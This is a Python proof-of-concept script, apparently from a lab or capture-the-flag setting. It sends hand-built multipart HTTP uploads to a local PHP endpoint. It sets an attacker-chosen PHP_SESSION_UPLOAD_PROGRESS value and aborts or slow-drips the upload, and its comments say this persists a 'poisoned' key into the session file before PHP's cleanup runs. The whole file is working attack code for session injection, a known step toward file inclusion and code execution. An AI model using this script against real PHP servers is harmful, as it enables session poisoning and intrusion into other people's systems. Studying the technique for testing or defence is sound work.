import socket, sys, time

HOST = "127.0.0.1"
PORT = int(sys.argv[1])
CMD = sys.argv[2]              # "full" (complete upload) or "abort" (cut mid-file)
SID = sys.argv[3]
PROG = sys.argv[4]             # value for PHP_SESSION_UPLOAD_PROGRESS field
PATH = sys.argv[5] if len(sys.argv) > 5 else "/inj.php"
BND = b"UctxUp2026"

def part(name, value, filename=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return b"--" + BND + b"\r\n" + d + b"\r\n\r\n" + value + b"\r\n"

def header(clen):
    return (f"POST {PATH} HTTP/1.1\r\nHost: {HOST}\r\n"
            f"Cookie: PHPSESSID={SID}\r\n"
            f"Content-Type: multipart/form-data; boundary={BND.decode()}\r\n"
            f"Content-Length: {clen}\r\nConnection: close\r\n\r\n").encode()

body = part(b"PHP_SESSION_UPLOAD_PROGRESS", PROG.encode())
# declare a 4MB file; only send the first chunk if aborting
filedata = b"A" * (1024 * 1024)
body += part(b"f", filedata, filename=b"notes.txt")
body += b"--" + BND + b"--\r\n"

s = socket.create_connection((HOST, PORT), timeout=15)
if CMD == "abort":
    # send full request header + progress field + COMPLETE file-part header
    # + the first 64KB of file data, then cut the socket mid-file. The parser
    # has fired FILE_START (key registered) but never MULTIPART_EVENT_END
    # (cleanup never runs) and never completes the body.
    fp = part(b"f", filedata, filename=b"notes.txt")
    fp_hdr = fp[:fp.find(b"\r\n\r\n") + 4]
    s.sendall(header(len(body)) + part(b"PHP_SESSION_UPLOAD_PROGRESS", PROG.encode()) + fp_hdr + filedata[:65536])
    time.sleep(0.5)
    s.close()
    print("ABORTED mid-upload (cleanup never reached)")
elif CMD == "slow":
    # trickle the file over ~5s; the rfc1867 hook persists the poisoned key
    # to the session file at FILE_START/updates, BEFORE cleanup can run.
    fp = part(b"f", filedata, filename=b"notes.txt")
    fp_hdr = fp[:fp.find(b"\r\n\r\n") + 4]
    s.sendall(header(len(body)) + part(b"PHP_SESSION_UPLOAD_PROGRESS", PROG.encode()) + fp_hdr)
    chunk = 128 * 1024
    sent = 0
    while sent < len(filedata):
        s.sendall(filedata[sent:sent + chunk])
        sent += chunk
        time.sleep(0.55)
    s.sendall(b"\r\n--" + BND + b"--\r\n")
    s.settimeout(10)
    try:
        while s.recv(65536):
            pass
    except Exception:
        pass
    s.close()
    print("SLOW upload finished")
else:
    s.sendall(header(len(body)) + body)
    s.settimeout(15)
    data = b""
    while True:
        try:
            c = s.recv(65536)
        except Exception:
            break
        if not c:
            break
        data += c
    s.close()
    first = data.split(b"\r\n", 1)[0]
    print("STATUS:", first.decode(errors="replace"))
